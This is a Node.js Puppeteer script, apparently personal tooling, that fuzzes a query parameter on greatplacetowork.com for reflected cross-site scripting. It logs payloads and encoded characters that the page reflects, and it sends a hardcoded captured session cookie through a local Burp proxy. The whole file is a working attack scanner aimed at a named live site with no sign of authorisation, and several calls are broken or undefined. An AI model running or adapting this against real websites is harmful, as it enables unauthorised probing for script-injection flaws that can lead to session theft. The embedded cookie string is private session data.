const puppeteer = require('puppeteer');
const prettier = require('prettier');
//const useProxy = require('puppeteer-page-proxy');
const fs = require('fs');//.promises;
//import fsPromises from "node:fs/promises";
var request = require('request');
const { spawn } = require("child_process");
const process = require("process");

var baseurl = 'https://www.greatplacetowork.com/best-workplaces?view=scobar{{FUZZ}}';
var burp0_cookie = "4d71905988434ce8dce55e1720cd379e=m5lr5dfh23d73ofs24qkndq814; _gcl_au=1.1.80471966.1725211148; _gid=GA1.2.1087259732.1725211149; _fbp=fb.1.1725211151102.950396905684249819; _mkto_trk=id:520-AOO-982&token:_mch-greatplacetowork.com-1725211151723-51564; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=1347%2C185.217.143.152%2C1%2C57c052c16d426b06a6c9cf24aaa459a7%2CChrome%2CTR; _CEFT=Q%3D%3D%3D; _uetsid=4d62ab80688611efaa72377157f26dc1; _uetvid=4d62cd20688611efa3db73eaea97c298; cebsp_=13; _ga=GA1.1.1004176729.1725211142; _ga_1MXS8REX63=GS1.1.1725223530.2.1.1725225403.60.0.0; _ce.s=v~afb8e649a8fef6036248ed0e99280b23d02a5f15~lcw~1725225609667~lva~1725211151900~vpv~0~v11.fhb~1725211153477~v11.lhb~1725225568159~gtrk.la~m0k2s7ln~v11.cs~415473~v11.s~240fade0-68a3-11ef-b663-77f7ff316b73~v11.sla~1725225609667~v11.send~1725225610278~lcw~1725225610278";
var burp0_headers = {
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "en-US",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
    'Cookie': burp0_cookie
}

var cook = burp0_cookie;// '4d71905988434ce8dce55e1720cd379e=m5lr5dfh23d73ofs24qkndq814; _gcl_au=1.1.80471966.1725211148; _gid=GA1.2.1087259732.1725211149; _fbp=fb.1.1725211151102.950396905684249819; _mkto_trk=id:520-AOO-982&token:_mch-greatplacetowork.com-1725211151723-51564; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=1347%2C185.217.143.152%2C1%2C57c052c16d426b06a6c9cf24aaa459a7%2CChrome%2CTR; _CEFT=Q%3D%3D%3D; _uetsid=4d62ab80688611efaa72377157f26dc1; _uetvid=4d62cd20688611efa3db73eaea97c298; cebsp_=13; _ga=GA1.1.1004176729.1725211142; _ga_1MXS8REX63=GS1.1.1725223530.2.1.1725225403.60.0.0; _ce.s=v~afb8e649a8fef6036248ed0e99280b23d02a5f15~lcw~1725225609667~lva~1725211151900~vpv~0~v11.fhb~1725211153477~v11.lhb~1725225568159~gtrk.la~m0k2s7ln~v11.cs~415473~v11.s~240fade0-68a3-11ef-b663-77f7ff316b73~v11.sla~1725225609667~v11.send~1725225610278~lcw~1725225610278';
var car = cook.split(';');
var cookobj = [];
for(var i=0;i<=car.length-1;i++){
var ar2 = car[i].split('=');
var obj={name:ar2[0].trim(),value:ar2[1].trim()};
//obj[ar2[0].trim()] = ar2[1].trim();

cookobj[cookobj.length] = obj;
//cookobj += '"' + ar2[0].trim() + '":"' + ar2[1].trim() + '",';
}
//console.log(cookobj);



var page = null;
var browser = null;
var metho = '';
var body = '';
var pages = 0;
var cupage = 0;
var payloads = [];

function cmd(...command) {
    let p = spawn(command[0], command.slice(1));
    return new Promise((resolveFunc) => {
        p.stdout.on("data", (x) => {
            process.stdout.write(x.toString());
            cmdout = x.toString();
        });
        p.stderr.on("data", (x) => {
            process.stderr.write(x.toString());
        });
        p.on("exit", (code) => {
            resolveFunc(code);
        });
    });
}

function isnullval(tval) {
    var retval = false;
    try {
        if ((tval == "") || (tval == undefined) || (tval == null) || (tval == NaN) || (jQuery.trim(tval) == "")) { retval = true; }
    } catch (ex) {
        retval = false;
    }
    return retval;
}

async function forever() {

    var dt = await readFile('params.txt');
    cupage = parseInt(await readFile('index.txt'));
    payloads = dt.split('\n');
    pages = payloads.length;
    await test_payloads();

}

async function readFile(path) {
    return new Promise((resolve, reject) => {
        fs.readFile(path, 'utf8', function (err, data) {
            if (err) {
                reject(err);
            }
            resolve(data);
        });
    });
}

async function appendToFile(filePath, dataToAppend) {
    try {
        await fs.promises.appendFile(filePath, dataToAppend, 'utf8');
        //console.log('Data appended successfully!');
    } catch (error) {
        console.error('Error appending data:', error);
    }
}

async function writeToFile(filePath, dataToWrite) {
    try {
        await fs.promises.writeFile(filePath, dataToWrite, 'utf8');
        //console.log('Data written successfully!');
    } catch (error) {
        console.error('Error writing data:', error);
    }
}

function doRequest(dcmd, dval) {
    return new Promise(function (resolve, reject) {
        request({ url: queryapi, qs: { cmd: dcmd, val: dval } }, function (error, res, body) {
            if (!error && res.statusCode === 200) {
                resolve(body);
            } else {
                reject(error);
            }
        });

    });
}

async function delay(ms) {
    return await new Promise(resolve => setTimeout(resolve, ms));
}

async function test_payloads() {

    var payl = payloads[cupage];
    console.log(cupage + '/' + pages);


    metho = 'get';
    //await page.setExtraHTTPHeaders({
    //	"Sec-Ch-Ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"101\"","Accept": "application/json, text/plain, */*",'Authorization': 'Bearer ' + token,		"Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https:///", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"
    //});

    var q = baseurl + '?' + payl + '=scobar';
    console.log(q);
    await page.setExtraHTTPHeaders({ ...burp0_headers });
    await page.setCookie(...burp0_cookie);
    const response = await page.goto(q, { timeout: 0 });



    try {

        var statuscode = response.status();
        //console.log(statuscode);

        //if (statuscode == 200) {
        const responseBody = await response.text();
        console.log('resp: ' + responseBody.length);
        //var rspj = JSON.parse(responseBody);

        var havexss = await page.evaluate(() => {
            function globalSearch(startObject, value) {
                var stack = [[startObject, '']];
                var searched = [];
                var found = false;

                var isArray = function (test) {
                    return Object.prototype.toString.call(test) === '[object Array]';
                }

                while (stack.length) {
                    try {
                        var fromStack = stack.pop();
                        var obj = fromStack[0];
                        var address = fromStack[1];

                        if (typeof obj == typeof value && obj.indexOf(value) > -1) {
                            var found = address;
                            break;
                        } else if (typeof obj == "object" && searched.indexOf(obj) == -1) {
                            if (isArray(obj)) {
                                var prefix = '[';
                                var postfix = ']';
                            } else {
                                var prefix = '.';
                                var postfix = '';
                            }
                            for (i in obj) {
                                stack.push([obj[i], address + prefix + i + postfix]);
                            }
                            searched.push(obj);
                        }
                    } catch (ex) { continue; }
                }
                return found == '' ? true : found;
            };
            var gret = globalSearch(window, 'scobar');
            if (gret == true) {
                return 'n';
            } else {
                return gret;
            }
        });

        havexss = havexss.toString().replace(new RegExp("[0-9]", "g"), "");
        havexss = havexss.toString().replaceAll('.', "");

        console.log(havexss + ' = ' + basereflect);
        if ((havexss == basereflect) || (havexss == 'n') || (reflectstor.indexOf(havexss) > -1)) {
            havexss = 'n';
        } else {
            reflectstor[reflectstor.length] = havexss.toString();
            havexss = 'y';
        }

        console.log(payl + ' = ' + havexss);
        console.log(reflectstor.length);

        if (havexss != 'n') {
            console.log(payl);
            appendToFile('okpayloads.txt', payl + '\n');
        }

        /*} else {
            console.log('server error ' + statuscode);
            process.exit(1);
        }*/

        console.log('\n\n');

        await delay(1000);


        cupage++;
        await writeToFile('index.txt', cupage.toString());


        if (cupage > (pages - 1)) {
            console.log('finished... ');
            process.exit(1);
        }
        await test_payloads();

    } catch (ex) {
        console.log('server error...\n' + ex.message);
        await delay(10000);
        await test_payloads();
    }


}

var basereflect = '';
var reflectstor = [];
var ascii = 0;

let encode = str => {
    let buf = [];
  
    for (var i = str.length - 1; i >= 0; i--) {
      buf.unshift(['&#', str[i].charCodeAt(), ';'].join(''));
    }
  
    return buf.join('');
  }
  
  let decode = str => {
    return str.replace(/&#(\d+);/g, function(match, dec) {
      return String.fromCharCode(dec);
    });
  }

async function test_unit() {

    metho = 'get';

    //var q = 'http://localhost/dom.html';
    var q = baseurl;
    q = q.replace('{{FUZZ}}', encodeURIComponent(encode(String.fromCharCode(ascii))));
    

    console.log(ascii + ' : ' + q);
    ascii++;

    
    await page.setExtraHTTPHeaders({ ...burp0_headers });
    //await page.setCookie({ ...cookobj});
    for (let i = 0; i < cookobj.length; i++) {
       // console.log('********** cookie '+i);
        //console.log(cookobj[i]);
        //await page.setCookie(cookobj[i]);
    }

    const response = await page.goto(q, { timeout: 0 });


    try {

        var statuscode = response.status();
        console.log(statuscode);

        //console.log(console.log(await page.cookies(q)));

        //if (statuscode == 200) {
        const responseBody = await response.text();
        if (responseBody.indexOf('scobar,') > -1) {
            console.log(ascii + ' faild');
            await delay(10000);
            await test_unit();
        } else {
            console.log('found: ' + 'ascii=' + (ascii - 1) + ' , ' + q);
            appendToFile('okpayloads-html-encode.txt', (ascii - 1) + ' : ' + String.fromCharCode(ascii-1) + '\n');
            //return;
            await delay(10000);
            await test_unit();
        }


    } catch (ex) {
        console.log('server error...\n' + ex.message);
    }


}

(async function main() {

    browser = await puppeteer.launch({
        headless: true,
        defaultViewport: null,
        devtools: true,
        args: ['--window-size=1920,1170', '--window-position=0,0', '--no-sandbox', '--proxy-server=127.0.0.1:8080', '--ignore-certificate-errors']
    });

    page = await browser.newPage();
    await page.setRequestInterception(true);

    page.on('request', interceptedRequest => {
        var data = {};
        if (metho == 'post') {
            data = {
                'method': 'POST',
                'postData': body
            };
        }
        if (metho == 'get') {
            data = {
                'method': 'GET'
            };
        }
        data.cookie = burp0_cookie;
        interceptedRequest.continue(data);
    });

    
    
    await test_unit();
    //console.log('base reflect = ' + basereflect);
    //await forever();

})();


